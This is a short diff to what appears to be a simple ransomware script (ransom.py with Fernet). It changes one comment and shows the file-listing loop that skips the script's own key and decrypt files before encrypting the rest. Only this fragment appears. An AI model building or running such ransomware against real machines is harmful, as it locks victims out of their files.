@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 
 files = []
 
-#search for files in our directory, only specifically including files, ignoring the key
+#search for files in your directory, only specifically including files, ignoring the key
 
 for file in os.listdir():
     if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py": 
